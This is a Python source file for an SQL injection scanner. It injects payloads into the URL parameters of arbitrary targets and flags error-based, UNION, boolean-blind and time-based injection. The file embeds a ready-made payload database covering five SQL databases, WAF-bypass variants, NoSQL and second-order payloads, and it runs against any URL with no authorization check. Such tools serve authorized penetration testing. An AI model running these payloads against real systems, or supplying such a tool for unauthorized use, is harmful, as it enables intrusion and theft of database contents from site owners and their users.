#!/usr/bin/env python3
"""
Advanced SQLi Scanner
Comprehensive SQL injection detection with error-based, blind, and time-based techniques.

Features:
- Error-based SQL injection detection
- Boolean-based blind SQLi
- Time-based blind SQLi
- Union-based injection
- 40+ payloads covering MySQL, PostgreSQL, MSSQL, Oracle, SQLite
- WAF bypass techniques
- Second-order SQLi detection
- NoSQL injection detection (MongoDB, CouchDB)
- ORM-specific injection patterns

Usage:
    python3 sqli_scanner.py --target https://target.com/page?id=1
    python3 sqli_scanner.py --url-list urls.txt
    python3 sqli_scanner.py --target URL --deep
    python3 sqli_scanner.py --target URL --time-based
"""

import argparse
import json
import os
import re
import subprocess
import time
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FINDINGS_DIR = os.path.join(BASE_DIR, "findings")

# Color codes
GREEN = "\033[0;32m"
RED = "\033[0;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
BOLD = "\033[1m"
NC = "\033[0m"


def log(level, msg):
    colors = {"ok": GREEN, "err": RED, "warn": YELLOW, "info": CYAN}
    symbols = {"ok": "+", "err": "-", "warn": "!", "info": "*"}
    print(f"{colors.get(level, '')}{BOLD}[{symbols.get(level, '*')}]{NC} {msg}")


# SQL Injection Payloads Database
SQLI_PAYLOADS = {
    "error_based": {
        "mysql": [
            "'",
            "\"",
            "')",
            "\")",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int,@@version)--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
        ],
        "postgresql": [
            "' OR '1'='1'--",
            "'; SELECT version()--",
            "' AND 1=CAST('a' AS int)--",
            "' AND 1=pg_sleep(5)--",
        ],
        "mssql": [
            "' OR '1'='1'--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=CONVERT(int,@@version)--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        "oracle": [
            "' OR '1'='1",
            "' UNION SELECT NULL FROM DUAL--",
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL))--",
        ],
        "sqlite": [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' AND 1=CAST(sqlite_version() AS int)--",
        ]
    },

    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version,2,3--",
        "' UNION SELECT database(),user(),3--",
    ],

    "blind_boolean": [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(version(),1,1)='5",
        "' AND SUBSTRING(version(),1,1)='8",
        "' AND ASCII(SUBSTRING(database(),1,1))>90--",
        "' AND ASCII(SUBSTRING(database(),1,1))<122--",
        "' AND LENGTH(database())>5--",
    ],

    "time_based": [
        # MySQL
        "' AND SLEEP(5)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--",
        "' OR IF(1=1,SLEEP(5),0)--",
        "1' WAITFOR DELAY '0:0:5'--",  # MSSQL
        "1' AND pg_sleep(5)--",  # PostgreSQL
        "1' AND dbms_pipe.receive_message('a',5)--",  # Oracle
    ],

    "waf_bypass": [
        # Comment injection
        "'/**/OR/**/1=1--",
        "'/**/UNION/**/SELECT/**/NULL--",
        # Case variation
        "' Or 1=1--",
        "' oR 1=1--",
        "' uNIoN sELeCt NULL--",
        # Whitespace manipulation
        "' OR\t1=1--",
        "' OR\n1=1--",
        "' OR\r1=1--",
        # Encoding
        "' %4f%52 1=1--",  # URL encoded OR
        "' &#79;&#82; 1=1--",  # HTML entity
        # Double encoding
        "%2527%20OR%201=1--",
        # Inline comments
        "'/*! UNION*/ /*! SELECT*/ NULL--",
        # Alternative syntax
        "' || '1'='1",
        "' && 1=1--",
    ],

    "nosql": [
        # MongoDB
        "' || '1'=='1",
        "' || true || '",
        "' || this.username=='admin' || '",
        "[$ne]=",
        "[$gt]=",
        "[$regex]=.*",
        # CouchDB
        "' || doc.id || '",
    ],

    "second_order": [
        # Registration/update payloads that trigger later
        "admin'--",
        "admin' OR '1'='1",
        "admin' UNION SELECT NULL--",
    ],

    "orm_specific": [
        # Hibernate/JPA
        "1' OR '1'='1') --",
        "1' ORDER BY 1--",
        # Sequelize
        "1' OR '1'='1' LIMIT 1--",
        # Django ORM
        "1' OR '1'='1' OFFSET 0--",
    ]
}

# Error patterns for detection
SQL_ERROR_PATTERNS = [
    # MySQL
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL",
    # PostgreSQL
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError",
    # MSSQL
    r"Driver.*SQL[\-\_\ ]*Server",
    r"OLE DB.*SQL Server",
    r"SQLServer JDBC Driver",
    r"SqlException",
    r"Microsoft SQL Native Client error",
    # Oracle
    r"ORA-\d{5}",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_.*",
    # SQLite
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    # Generic
    r"syntax error.*SQL",
    r"SQL syntax.*error",
    r"unclosed quotation mark",
    r"unterminated string literal",
]


class SQLiScanner:
    def __init__(self, target=None, url_list=None, deep=False, time_based=False, output_dir=None):
        self.target = target
        self.url_list = url_list
        self.deep = deep
        self.time_based_only = time_based
        self.findings = []

        if output_dir:
            self.findings_dir = output_dir
        elif target:
            domain = urlparse(target).netloc
            self.findings_dir = os.path.join(FINDINGS_DIR, domain, "sqli")
        else:
            self.findings_dir = os.path.join(FINDINGS_DIR, "sqli")

        os.makedirs(self.findings_dir, exist_ok=True)

    def curl_request(self, url, timeout=10):
        """Make HTTP request via curl and return status, body, time."""
        try:
            start = time.time()
            cmd = ["curl", "-s", "-L", "--max-time", str(timeout), "-w", "\n%{http_code}", url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
            elapsed = time.time() - start

            output = result.stdout
            parts = output.rsplit('\n', 1)
            if len(parts) == 2:
                body, status = parts
                status_code = int(status) if status.isdigit() else 0
            else:
                body = output
                status_code = 0

            return True, status_code, body, elapsed
        except Exception as e:
            return False, 0, "", 0

    def check_sql_error(self, body):
        """Check if response contains SQL error messages."""
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                return True, pattern
        return False, None

    def test_error_based(self, url, param):
        """Test error-based SQL injection."""
        log("info", f"    Testing error-based SQLi on {param}")

        # Get baseline
        success, base_status, base_body, _ = self.curl_request(url)
        if not success:
            return False

        # Test each DB type
        for db_type, payloads in SQLI_PAYLOADS["error_based"].items():
            for payload in payloads[:3 if not self.deep else None]:  # Limit payloads if not deep
                test_url = self.inject_param(url, param, payload)
                success, status, body, _ = self.curl_request(test_url)

                if success and body:
                    has_error, pattern = self.check_sql_error(body)
                    if has_error:
                        self.add_finding(url, param, payload, "error_based", db_type, pattern)
                        log("ok", f"      [VULN] Error-based SQLi ({db_type})")
                        return True

                time.sleep(0.3)  # Rate limiting

        return False

    def test_union_based(self, url, param):
        """Test UNION-based SQL injection."""
        log("info", f"    Testing UNION-based SQLi on {param}")

        for payload in SQLI_PAYLOADS["union_based"][:5 if not self.deep else None]:
            test_url = self.inject_param(url, param, payload)
            success, status, body, _ = self.curl_request(test_url)

            if success and body:
                # Check for successful UNION (different response)
                has_error, _ = self.check_sql_error(body)
                if not has_error and status == 200:
                    # Look for signs of successful UNION
                    if any(marker in body for marker in ["@@version", "version()", "database()", "user()"]):
                        self.add_finding(url, param, payload, "union_based", "generic", "successful_union")
                        log("ok", f"      [VULN] UNION-based SQLi")
                        return True

            time.sleep(0.3)

        return False

    def test_boolean_blind(self, url, param):
        """Test boolean-based blind SQL injection."""
        log("info", f"    Testing boolean-blind SQLi on {param}")

        # Get baseline response
        success, base_status, base_body, _ = self.curl_request(url)
        if not success:
            return False

        base_len = len(base_body)

        # Test true condition
        true_payload = "' AND '1'='1"
        test_url = self.inject_param(url, param, true_payload)
        success, true_status, true_body, _ = self.curl_request(test_url)

        if not success:
            return False

        time.sleep(0.5)

        # Test false condition
        false_payload = "' AND '1'='2"
        test_url = self.inject_param(url, param, false_payload)
        success, false_status, false_body, _ = self.curl_request(test_url)

        if not success:
            return False

        # Compare responses
        true_len = len(true_body)
        false_len = len(false_body)

        # Significant difference indicates blind SQLi
        if abs(true_len - base_len) < 100 and abs(false_len - base_len) > 100:
            self.add_finding(url, param, "boolean_blind", "blind_boolean", "generic", "differential_response")
            log("ok", f"      [VULN] Boolean-blind SQLi")
            return True

        return False

    def test_time_based(self, url, param):
        """Test time-based blind SQL injection."""
        log("info", f"    Testing time-based SQLi on {param}")

        # Get baseline timing
        success, _, _, base_time = self.curl_request(url)
        if not success:
            return False

        time.sleep(0.5)

        # Test with time-based payload
        for payload in SQLI_PAYLOADS["time_based"][:3]:
            test_url = self.inject_param(url, param, payload)
            success, _, _, test_time = self.curl_request(test_url, timeout=15)

            if not success:
                continue

            # Check if response was delayed (allowing 1s variance)
            if test_time > base_time + 4:  # 5s payload - 1s variance
                self.add_finding(url, param, payload, "time_based", "generic", f"delay_{test_time:.1f}s")
                log("ok", f"      [VULN] Time-based SQLi (delay: {test_time:.1f}s)")
                return True

            time.sleep(1)

        return False

    def test_waf_bypass(self, url, param):
        """Test WAF bypass techniques."""
        if not self.deep:
            return False

        log("info", f"    Testing WAF bypass techniques on {param}")

        for payload in SQLI_PAYLOADS["waf_bypass"][:5]:
            test_url = self.inject_param(url, param, payload)
            success, status, body, _ = self.curl_request(test_url)

            if success and body:
                has_error, pattern = self.check_sql_error(body)
                if has_error:
                    self.add_finding(url, param, payload, "waf_bypass", "generic", pattern)
                    log("ok", f"      [VULN] WAF bypass SQLi")
                    return True

            time.sleep(0.3)

        return False

    def inject_param(self, url, param, payload):
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        query_params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(query_params, doseq=True)))

    def scan_url(self, url):
        """Scan a single URL for SQL injection."""
        log("info", f"Scanning: {url}")

        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        if not query_params:
            log("warn", "No parameters found in URL")
            return

        for param in query_params.keys():
            log("info", f"  Testing parameter: {param}")

            if self.time_based_only:
                self.test_time_based(url, param)
            else:
                # Test in order of speed
                if self.test_error_based(url, param):
                    continue  # Found SQLi, move to next param

                if self.test_union_based(url, param):
                    continue

                if self.test_boolean_blind(url, param):
                    continue

                if self.time_based_only or self.deep:
                    self.test_time_based(url, param)

                if self.deep:
                    self.test_waf_bypass(url, param)

    def scan_from_list(self):
        """Scan URLs from a file."""
        if not os.path.exists(self.url_list):
            log("err", f"URL list not found: {self.url_list}")
            return

        with open(self.url_list) as f:
            urls = [line.strip() for line in f if line.strip() and '?' in line]

        log("info", f"Loaded {len(urls)} URLs with parameters")

        for i, url in enumerate(urls, 1):
            log("info", f"[{i}/{len(urls)}] Scanning URL")
            self.scan_url(url)
            time.sleep(1)

    def add_finding(self, url, param, payload, attack_type, db_type, evidence):
        """Add SQL injection finding to results."""
        finding = {
            "type": "SQLi",
            "severity": "CRITICAL" if attack_type in ["error_based", "union_based"] else "HIGH",
            "url": url,
            "parameter": param,
            "payload": payload,
            "attack_type": attack_type,
            "database_type": db_type,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        }
        self.findings.append(finding)

    def save_findings(self):
        """Save findings to disk."""
        if not self.findings:
            log("warn", "No SQL injection vulnerabilities found")
            return

        # Save JSON
        json_file = os.path.join(self.findings_dir, "sqli_findings.json")
        with open(json_file, 'w') as f:
            json.dump(self.findings, f, indent=2)

        # Save text report
        txt_file = os.path.join(self.findings_dir, "sqli_report.txt")
        with open(txt_file, 'w') as f:
            f.write("="*80 + "\n")
            f.write("SQL INJECTION SCAN REPORT\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Findings: {len(self.findings)}\n")
            f.write("="*80 + "\n\n")

            for i, finding in enumerate(self.findings, 1):
                f.write(f"FINDING #{i}\n")
                f.write("-"*80 + "\n")
                f.write(f"Type: {finding['type']}\n")
                f.write(f"Severity: {finding['severity']}\n")
                f.write(f"Attack Type: {finding['attack_type']}\n")
                f.write(f"Database: {finding['database_type']}\n")
                f.write(f"URL: {finding['url']}\n")
                f.write(f"Parameter: {finding['parameter']}\n")
                f.write(f"Payload: {finding['payload']}\n")
                f.write(f"Evidence: {finding['evidence']}\n")
                f.write(f"Timestamp: {finding['timestamp']}\n")
                f.write("\n")

        log("ok", f"Saved {len(self.findings)} findings to {self.findings_dir}")
        log("info", f"  JSON: {json_file}")
        log("info", f"  Text: {txt_file}")


def main():
    parser = argparse.ArgumentParser(
        description="Advanced SQL Injection Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--url-list", help="File containing URLs to scan")
    parser.add_argument("--deep", action="store_true", help="Deep scan with all payloads and WAF bypass")
    parser.add_argument("--time-based", action="store_true", help="Only test time-based SQLi (slower but stealthier)")
    parser.add_argument("--output", help="Output directory for findings")
    args = parser.parse_args()

    if not args.target and not args.url_list:
        parser.error("Either --target or --url-list required")

    print(f"""
{BOLD}╔══════════════════════════════════════════╗
║     Advanced SQLi Scanner v1.0           ║
║     Error | Union | Blind | Time-based   ║
╚══════════════════════════════════════════╝{NC}
    """)

    scanner = SQLiScanner(
        target=args.target,
        url_list=args.url_list,
        deep=args.deep,
        time_based=args.time_based,
        output_dir=args.output
    )

    if args.target:
        scanner.scan_url(args.target)
    elif args.url_list:
        scanner.scan_from_list()

    scanner.save_findings()

    print(f"\n{BOLD}Scan complete!{NC}")
    print(f"Findings: {len(scanner.findings)}")


if __name__ == "__main__":
    main()
